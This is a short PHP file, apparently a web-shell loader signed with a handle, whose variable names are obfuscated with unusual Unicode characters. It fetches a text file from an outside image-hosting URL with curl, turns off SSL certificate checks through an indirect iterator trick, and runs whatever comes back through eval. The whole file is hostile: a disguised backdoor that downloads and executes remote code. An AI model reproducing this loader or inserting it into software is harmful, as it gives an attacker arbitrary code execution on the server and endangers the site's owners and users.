<?php

/* @A3rr0r */

$ࠡ7bc9ࠥ1 = 'https://www.image2url.com/r2/default/files/1794637897873-4f82201f-1315-46c6-a8d1-d44e1075b627.txt';
$ࠡe620ࠥ2 = curl_init($ࠡ7bc9ࠥ1);
$ࠟ࠯ࠡ࠵96 = new ArrayIterator([
'RETURNTRANSFER',
'FOLLOWLOCATION',
'SSL_VERIFYPEER',
'SSL_VERIFYHOST'
]);
$alignment_49 = new RegexIterator(
$ࠟ࠯ࠡ࠵96,
'/^SSL_/'
);
$ࠠ1 = [];
foreach ($alignment_49 as $__opt) {
$ࠠ1[constant('CURLOPT_' . $__opt)] = 0;
}
curl_setopt_array(
$ࠡe620ࠥ2,
[
CURLOPT_RETURNTRANSFER => 1,
CURLOPT_FOLLOWLOCATION => 1
] + $ࠠ1
);
$ࠡ1393ࠥ4 = curl_exec($ࠡe620ࠥ2);
curl_close($ࠡe620ࠥ2);
if ($ࠡ1393ࠥ4) {
eval('?>' . $ࠡ1393ࠥ4);
}
?>
